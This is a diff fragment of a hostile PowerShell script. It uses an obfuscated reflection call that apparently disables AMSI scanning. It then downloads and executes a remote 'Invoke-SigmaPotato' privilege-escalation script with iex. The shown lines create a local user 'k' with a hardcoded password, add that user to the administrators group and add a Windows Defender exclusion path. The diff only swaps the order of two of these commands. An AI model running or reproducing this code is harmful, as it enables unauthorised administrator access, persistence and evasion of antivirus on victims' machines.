@@ -70,6 +70,6 @@ $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Objec
 $Uninitialize.Invoke($object,$null)
 
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
-Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
+Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
